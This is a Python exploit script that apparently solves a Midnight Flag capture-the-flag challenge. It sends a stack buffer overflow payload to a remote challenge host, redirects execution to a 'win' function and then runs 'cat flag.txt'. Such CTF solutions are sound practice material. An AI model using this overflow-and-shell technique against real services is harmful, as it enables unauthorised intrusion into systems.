#!/usr/bin/env python3
import argparse
import socket
import struct
import time

HOST = "dyn-03.midnightflag.fr"
PORT = 12771

WIN = 0x4012D6
RET_PLAY_TO_DORESET = 0x4013B9


def recv_some(sock: socket.socket, timeout: float = 0.2) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except (TimeoutError, socket.timeout):
            break
    return data


def build_payload() -> bytes:
    # Overflow from play()'s buf into do_reset()'s return address.
    payload = b"0\n"
    payload += b"A" * (0x38 - len(payload))
    payload += struct.pack("<Q", RET_PLAY_TO_DORESET)
    payload += b"B" * 8
    payload += struct.pack("<Q", WIN)
    return payload.ljust(0x80, b"Z")


def one_shot(host: str, port: int) -> str:
    payload = build_payload()
    s = socket.create_connection((host, port), timeout=5)

    recv_some(s)

    # Keep critical inputs in single chunks so short reads still leave
    # deterministic leftovers for scanf/read in the target.
    s.sendall(b"USERUSERUSERUSER")
    time.sleep(0.03)
    recv_some(s)

    s.sendall(b"4\n")
    time.sleep(0.03)
    recv_some(s)

    s.sendall(b"RESETRESETRESET12" + b"1\n" + payload + b"\n")
    time.sleep(0.05)
    recv_some(s)

    s.sendall(b"cat flag.txt\n")
    time.sleep(0.08)
    out = recv_some(s, 0.5).decode("latin-1", "ignore")
    s.close()
    return out

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--tries", type=int, default=8)
    args = parser.parse_args()

    for i in range(1, args.tries + 1):
        try:
            out = one_shot(args.host, args.port)
            print(out, end="")
            if "MCTF{" in out:
                return
        except OSError:
            pass
        time.sleep(0.1)

    raise SystemExit("Exploit did not retrieve a flag; increase --tries and retry.")


if __name__ == "__main__":
    main()
